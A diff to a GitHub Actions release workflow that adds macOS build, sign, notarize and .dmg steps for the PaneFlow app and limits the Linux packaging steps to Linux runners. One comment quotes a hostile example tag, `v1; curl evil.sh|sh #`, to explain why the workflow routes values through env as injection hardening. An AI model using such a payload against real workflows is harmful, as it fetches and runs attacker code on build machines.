@@ -14,28 +14,55 @@ jobs:
   build:
     name: Build ${{ matrix.target }}
     runs-on: ${{ matrix.runs-on }}
+    # US-019 AC5: legs without `continue-on-error: true` in their matrix
+    # entry default to `false` and block the release on failure. The Intel
+    # macOS leg sets `continue-on-error: true` in its matrix include, which
+    # lifts through this expression to the per-leg behaviour.
+    continue-on-error: ${{ matrix.continue-on-error == true }}
     strategy:
-      # fail-fast: true enforces PRD AC6 for US-019 — if the aarch64 leg fails
-      # while x86_64 succeeds (or vice versa), GitHub cancels the still-running
-      # leg and the whole release is marked failed. No half-matrix ships.
+      # fail-fast: true keeps the cross-arch Linux matrix atomic — a broken
+      # aarch64 Linux build cancels the x86_64 leg and vice versa, so we
+      # never ship a half-matrix Linux release. The macOS Intel leg below
+      # opts OUT of this via `continue-on-error: true` (AC5): a best-effort
+      # Intel failure is allowed to not block the release cut.
       fail-fast: true
       matrix:
         include:
           - target: x86_64-unknown-linux-gnu
             arch: x86_64
             runs-on: ubuntu-22.04
-          # US-019: native aarch64 build. Hosted ARM runner (in GitHub public
-          # preview since late 2024) — explicitly NOT `cross` and NOT QEMU,
-          # matching Zed's own `bundle_linux_aarch64` pattern. Spike evidence:
+          # Hosted ARM runner (in GitHub public preview since late 2024) —
+          # explicitly NOT `cross` and NOT QEMU, matching Zed's own
+          # `bundle_linux_aarch64` pattern. Spike evidence:
           # tasks/spike-aarch64-build.md.
           - target: aarch64-unknown-linux-gnu
             arch: aarch64
             runs-on: ubuntu-22.04-arm
+          # US-019: macOS aarch64 (Apple Silicon). Native build on
+          # GitHub-hosted macos-14, chains through the US-013→US-016
+          # bundle + sign + notarize + .dmg pipeline. Uses the same
+          # TAG value as the Linux legs; the macOS-only prelude below
+          # strips the leading `v` before feeding it to Info.plist
+          # (CFBundleShortVersionString requires bare semver).
+          - target: aarch64-apple-darwin
+            arch: aarch64
+            runs-on: macos-14
+          # US-019 AC5: best-effort Intel Mac. `continue-on-error: true`
+          # keeps a flaky Intel leg (rarer hardware, slower hosted
+          # runners, x86_64 GPUI code paths see less daily use) from
+          # blocking a release. When it succeeds, the produced .dmg
+          # is attached to the release alongside the other artifacts;
+          # when it fails, the release still ships without x86_64.
+          - target: x86_64-apple-darwin
+            arch: x86_64
+            runs-on: macos-13
+            continue-on-error: true
 
     steps:
       - uses: actions/checkout@v4
 
       - name: Install system dependencies
+        if: runner.os == 'Linux'
         run: |
           sudo apt-get update
           sudo apt-get install -y \
@@ -64,6 +91,7 @@ jobs:
       # malformed `<releases>` block (e.g., after a version bump that forgot
       # the `<release>` entry) never makes it into a shipped artifact.
       - name: Validate AppStream metainfo
+        if: runner.os == 'Linux'
         run: |
           appstreamcli validate \
             --no-net \
@@ -79,9 +107,11 @@ jobs:
           key: ${{ matrix.target }}
 
       - name: Install cargo-deb (pinned)
+        if: runner.os == 'Linux'
         run: cargo install cargo-deb --version 3.6.3 --locked
 
       - name: Install cargo-generate-rpm (pinned)
+        if: runner.os == 'Linux'
         # Version pinned to the one we validated against the TOML schema in
         # US-014. Bumping 0.20.0 → anything else requires re-reading the
         # upstream README: the `assets` inline-table grammar has changed in
@@ -109,6 +139,7 @@ jobs:
 
       # --- Phase 1 artifacts ---
       - name: Produce tar.gz
+        if: runner.os == 'Linux'
         # `TAG` routed via `env:` rather than inlining `${{ github.ref_name }}`
         # in the shell body — same injection-hardening rationale as the
         # AppImage step below (attacker-controlled tags must not reach bash
@@ -120,15 +151,18 @@ jobs:
         run: bash scripts/bundle-tarball.sh "$TAG"
 
       - name: Produce .deb
+        if: runner.os == 'Linux'
         run: cargo deb --no-build -p paneflow-app --target ${{ matrix.target }}
 
       - name: Lintian check
+        if: runner.os == 'Linux'
         run: |
           lintian \
             --suppress-tags bad-distribution-in-changes-file \
             target/${{ matrix.target }}/debian/*.deb
 
       - name: Produce .rpm
+        if: runner.os == 'Linux'
         # `-p src-app` is the DIRECTORY path (relative to workspace root),
         # not the crate name — cargo-generate-rpm 0.20.0 resolves `-p`
         # strictly as a path. `-p paneflow-app` fails with "No such file
@@ -158,6 +192,7 @@ jobs:
       # silent-unsigned-release path. The release-creating step at the
       # end of the job is downstream — it never runs if we exit here.
       - name: Sign .deb and .rpm with release key
+        if: runner.os == 'Linux'
         env:
           GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
           GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
@@ -348,6 +383,7 @@ jobs:
           done
 
       - name: Produce AppImage
+        if: runner.os == 'Linux'
         # `TAG` routed via `env:` rather than inlining `${{ github.ref_name }}`
         # in the shell body — same injection-hardening rationale as the
         # staging step below (attacker-controlled tags must not reach bash
@@ -358,13 +394,143 @@ jobs:
           TAG: ${{ github.ref_name }}
         run: bash scripts/bundle-appimage.sh "$TAG"
 
+      # ─── US-019 macOS .app assembly ──────────────────────────────────
+      # Mirrors the ci.yml Xcode preflight (kept intentionally duplicated
+      # — a drift here, e.g. an old runner image missing the Metal
+      # toolchain, surfaces as a labelled preflight failure rather than a
+      # cryptic mid-compile error).
+      - name: Verify Xcode CLT + Metal toolchain (macOS)
+        if: runner.os == 'macOS'
+        run: |
+          set -euo pipefail
+
+          CLT_PATH="$(xcode-select -p 2>/dev/null || true)"
+          if [ -z "$CLT_PATH" ] || [ ! -d "$CLT_PATH" ]; then
+            echo "::error::Xcode Command Line Tools not found (xcode-select -p returned '$CLT_PATH')."
+            exit 1
+          fi
+
+          SDK_PATH="$(xcrun --show-sdk-path 2>/dev/null || true)"
+          if [ -z "$SDK_PATH" ] || [ ! -d "$SDK_PATH" ]; then
+            echo "::error::macOS SDK not found (xcrun --show-sdk-path returned '$SDK_PATH')."
+            exit 1
+          fi
+
+          if ! xcrun --find metal >/dev/null 2>&1; then
+            echo "::error::Metal compiler not available — gpui_macos compiles .metal shaders and will fail without it."
+            exit 1
+          fi
+
+          METAL_HEADERS="$SDK_PATH/System/Library/Frameworks/Metal.framework/Headers"
+          if [ ! -d "$METAL_HEADERS" ]; then
+            echo "::error::Metal framework headers not found at $METAL_HEADERS."
+            exit 1
+          fi
+          echo "Xcode CLT: $CLT_PATH | SDK: $SDK_PATH | Metal: $(xcrun --find metal)"
+
+      # Assemble the .app bundle from the release binary cargo just built
+      # (the preceding "Build release binary" step ran for every leg
+      # including macOS, so target/<triple>/release/paneflow exists).
+      # `--version "${TAG#v}"` strips the leading 'v': Apple's
+      # CFBundleShortVersionString (stamped into Info.plist) must be
+      # bare semver. The .dmg filename US-008 matches on is also
+      # v-stripped (paneflow-0.2.0-aarch64-apple-darwin.dmg).
+      - name: Produce .app bundle
+        if: runner.os == 'macOS'
+        env:
+          ARCH: ${{ matrix.arch }}
+          TAG: ${{ github.ref_name }}
+        run: |
+          set -euo pipefail
+          version="${TAG#v}"
+          bash scripts/bundle-macos.sh --version "$version" --arch "$ARCH"
+
+      # ─── US-015 macOS codesign + notarize ────────────────────────────
+      # These steps are dormant today (no macos matrix leg) and come alive
+      # in US-019 when `runs-on: macos-14` joins the matrix. AC7: the
+      # `if: runner.os == 'macOS'` guard skips the step silently on every
+      # Linux leg, so the existing release pipeline is unaffected.
+      #
+      # Secrets used (AC1 — must be populated in repo settings before the
+      # first macOS release can ship):
+      #   APPLE_DEVELOPER_CERT_P12        — base64-encoded .p12
+      #   APPLE_DEVELOPER_CERT_PASSWORD   — password to decrypt the .p12
+      #   APPLE_ID                        — Apple Developer account email
+      #   APPLE_APP_SPECIFIC_PASSWORD     — app-specific password (not the
+      #                                     Apple ID password itself)
+      #   APPLE_TEAM_ID                   — 10-char team ID
+      #
+      # The `.app` input comes from `scripts/bundle-macos.sh`, added to
+      # the macos matrix leg in US-019. Sign → notarize → staple is the
+      # mandatory order: codesign attaches a signature, notarytool
+      # validates + registers it with Apple, stapler glues the ticket to
+      # the bundle so Gatekeeper accepts it offline.
+      - name: Sign macOS .app bundle
+        if: runner.os == 'macOS'
+        env:
+          APPLE_DEVELOPER_CERT_P12: ${{ secrets.APPLE_DEVELOPER_CERT_P12 }}
+          APPLE_DEVELOPER_CERT_PASSWORD: ${{ secrets.APPLE_DEVELOPER_CERT_PASSWORD }}
+          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
+        run: bash scripts/sign-macos.sh dist/PaneFlow.app
+
+      - name: Notarize + staple macOS .app bundle
+        if: runner.os == 'macOS'
+        env:
+          APPLE_ID: ${{ secrets.APPLE_ID }}
+          APPLE_APP_SPECIFIC_PASSWORD: ${{ secrets.APPLE_APP_SPECIFIC_PASSWORD }}
+          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
+        run: bash scripts/notarize-macos.sh dist/PaneFlow.app
+
+      # ─── US-016 .dmg assembly ────────────────────────────────────────
+      # Wraps the stapled .app in a drag-to-Applications .dmg. Zero new
+      # dependencies — hdiutil + osascript are built into macOS. Runs
+      # *after* notarization so the enclosed bundle already carries its
+      # Apple-issued stapled ticket.
+      #
+      # The output filename `paneflow-<tag>-<arch>-apple-darwin.dmg` is
+      # chosen to match US-008's `update_checker.rs::pick_asset`; any
+      # other shape would silently break the in-app update prompt for
+      # macOS users.
+      - name: Produce .dmg
+        if: runner.os == 'macOS'
+        env:
+          TAG: ${{ github.ref_name }}
+          ARCH: ${{ matrix.arch }}
+        run: |
+          set -euo pipefail
+          version="${TAG#v}"
+          bash scripts/create-dmg.sh --version "$version" --arch "$ARCH"
+
+      # Stage the .dmg + SHA-256 sibling into release-assets/ so the
+      # downstream `release` job picks it up alongside the Linux-leg
+      # artifacts. Mirrors the sha256 pattern used by the tar.gz step.
+      # Linux legs skip this entirely; US-019 adds the macos-14 matrix
+      # leg that activates it.
+      - name: Stage macOS .dmg
+        if: runner.os == 'macOS'
+        env:
+          TAG: ${{ github.ref_name }}
+          ARCH: ${{ matrix.arch }}
+        run: |
+          set -euo pipefail
+          mkdir -p release-assets
+          # US-019: filenames drop the leading `v` to match US-008's
+          # documented convention (paneflow-<semver>-<arch>-apple-darwin.dmg).
+          version="${TAG#v}"
+          dmg="paneflow-${version}-${ARCH}-apple-darwin.dmg"
+          cp "dist/${dmg}" "release-assets/${dmg}"
+          ( cd release-assets && shasum -a 256 "${dmg}" > "${dmg}.sha256" )
+          ls -la release-assets/
+
       # --- Stage all 4 artifacts with canonical names ---
+      # Linux-leg-only: the macOS .dmg is staged by its own step above.
       # Context values are passed via `env:` rather than inlined as
       # `${{ github.ref_name }}` inside the shell body — otherwise an
       # attacker-controlled tag like `v1; curl evil.sh|sh #` would be
       # shell-injected when bash parses the script. `env:` injects them
       # as environment variables, immune to shell interpretation.
       - name: Stage release assets
+        if: runner.os == 'Linux'
         env:
           TAG: ${{ github.ref_name }}
           ARCH: ${{ matrix.arch }}
@@ -405,7 +571,11 @@ jobs:
       - name: Upload release artifacts (for smoke-test jobs)
         uses: actions/upload-artifact@v4
         with:
-          name: release-assets-${{ matrix.arch }}
+          # US-019: include runner.os in the artifact name because Linux
+          # aarch64 and macOS aarch64 would otherwise collide on
+          # `release-assets-aarch64`. The publish + smoke jobs glob
+          # `release-assets-*`, so the new pattern is compatible.
+          name: release-assets-${{ matrix.arch }}-${{ runner.os }}
           path: release-assets/
           retention-days: 7
           compression-level: 0
@@ -489,7 +659,10 @@ jobs:
       - name: Download built .deb
         uses: actions/download-artifact@v4
         with:
-          name: release-assets-x86_64
+          # US-019: artifact name carries runner.os to avoid Linux/macOS
+          # aarch64 name collisions. Linux-x86_64 leg uploads to this
+          # exact name.
+          name: release-assets-x86_64-Linux
           path: ./release-assets
 
       - name: Install paneflow.deb (exercises postinst)
@@ -552,7 +725,8 @@ jobs:
       - name: Download built .rpm
         uses: actions/download-artifact@v4
         with:
-          name: release-assets-x86_64
+          # US-019: see the deb smoke test for the same naming rationale.
+          name: release-assets-x86_64-Linux
           path: ./release-assets
 
       - name: Install paneflow.rpm (exercises %post scriptlet)
